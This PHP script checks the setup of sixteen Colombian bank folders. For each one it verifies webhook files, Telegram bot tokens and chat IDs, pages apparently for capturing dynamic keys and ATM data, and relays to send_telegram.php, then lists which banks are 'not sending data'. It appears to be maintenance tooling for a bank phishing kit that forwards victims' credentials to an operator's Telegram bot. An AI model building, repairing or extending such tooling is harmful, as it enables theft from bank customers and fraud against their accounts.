<?php
// verify_webhooks_banks.php - Verificar configuración de webhooks y archivos de verificación de todos los bancos
echo "<h1>Verificación de Webhooks y Archivos de Verificación por Banco</h1>";
echo "<pre>";

// Lista de bancos
$banks = [
    'avvillas' => 'b-34f1',
    'bbva' => 'b-34f13',
    'caja-social' => 'b-34f2',
    'bogota' => 'b-34f4',
    'davivienda' => 'b-34f10',
    'occidente' => 'b-34f14',
    'falabella' => 'b-34f5',
    'finandina' => 'b-34f6',
    'itau' => 'b-34f7',
    'mundo-mujer' => 'b-34f01',
    'popular' => 'b-34f18',
    'serfinanza' => 'b-34f16',
    'union' => 'b-34f0',
    'bancolombia' => 'b-34f9',
    'lulo' => 'b-34f02',
    'scotiabank-colpatria' => 'b-34f12'
];

$base_path = __DIR__ . '/transaction/';

$issues = [];

foreach ($banks as $bank_name => $bank_folder) {
    echo "\n=== Verificando banco: {$bank_name} (folder: {$bank_folder}) ===\n";

    $bank_path = $base_path . $bank_folder . '/';

    if (!is_dir($bank_path)) {
        echo "❌ Carpeta no existe: {$bank_path}\n";
        $issues[$bank_name][] = "Carpeta no existe";
        continue;
    }

    // Verificar webhook.php
    $webhook_file = $bank_path . 'webhook.php';
    if (file_exists($webhook_file)) {
        echo "✅ webhook.php existe\n";
    } else {
        echo "❌ webhook.php NO existe\n";
        $issues[$bank_name][] = "Falta webhook.php";
    }

    // Verificar config.php
    $config_file = $bank_path . 'config.php';
    if (file_exists($config_file)) {
        echo "✅ config.php existe\n";
        $config = include $config_file;
        if (isset($config['bot_token']) && isset($config['chat_id'])) {
            echo "✅ Configuración de Telegram OK\n";
        } else {
            echo "❌ Configuración de Telegram incompleta\n";
            $issues[$bank_name][] = "Config Telegram incompleta";
        }
    } else {
        echo "❌ config.php NO existe\n";
        $issues[$bank_name][] = "Falta config.php";
    }

    // Verificar archivos de verificación
    $verify_files = ['verificar_dinamica.php', 'verificar_respuesta.php', 'verificar_cajero.php'];
    $found_verify = false;
    foreach ($verify_files as $file) {
        if (file_exists($bank_path . $file)) {
            echo "✅ {$file} existe\n";
            $found_verify = true;

            // Revisar si tiene polling deshabilitado
            $content = file_get_contents($bank_path . $file);
            if (strpos($content, '// $ch = curl_init') !== false || strpos($content, 'curl_init("https://api.telegram.org') === false) {
                echo "⚠️  Polling de Telegram DESHABILITADO en {$file}\n";
                $issues[$bank_name][] = "Polling deshabilitado en {$file}";
            }
        }
    }

    if (!$found_verify) {
        echo "❌ Ningún archivo de verificación encontrado\n";
        $issues[$bank_name][] = "Faltan archivos de verificación";
    }

    // Verificar si llama a send_telegram.php
    $files = glob($bank_path . '*.php');
    $calls_send_telegram = false;
    foreach ($files as $file) {
        $content = file_get_contents($file);
        if (strpos($content, 'send_telegram.php') !== false) {
            $calls_send_telegram = true;
            break;
        }
    }

    if ($calls_send_telegram) {
        echo "✅ Llama a send_telegram.php\n";
    } else {
        echo "❌ NO llama a send_telegram.php\n";
        $issues[$bank_name][] = "No llama a send_telegram.php";
    }

    // Verificar PSE webhook URL (si existe)
    if (file_exists($config_file)) {
        $config = include $config_file;
        if (isset($config['pse_webhook_url'])) {
            echo "✅ PSE webhook URL configurado: {$config['pse_webhook_url']}\n";
        } else {
            echo "❌ PSE webhook URL NO configurado\n";
            $issues[$bank_name][] = "Falta PSE webhook URL";
        }
    }
}

echo "\n=== RESUMEN DE PROBLEMAS ===\n";
if (empty($issues)) {
    echo "✅ Todos los bancos están correctamente configurados\n";
} else {
    foreach ($issues as $bank => $problems) {
        echo "❌ {$bank}: " . implode(', ', $problems) . "\n";
    }
}

echo "\n=== CONCLUSIONES ===\n";
echo "Los bancos que no envían datos probablemente tienen:\n";
echo "- Polling de Telegram deshabilitado\n";
echo "- Falta configuración de PSE webhook\n";
echo "- No llaman a send_telegram.php\n";
echo "\nPara solucionar:\n";
echo "1. Configurar URLs de webhook de PSE en config.php de cada banco\n";
echo "2. Asegurar que los archivos de verificación llamen a send_telegram.php\n";
echo "3. Revisar si PSE está enviando webhooks a las URLs correctas\n";

echo "</pre>";
?>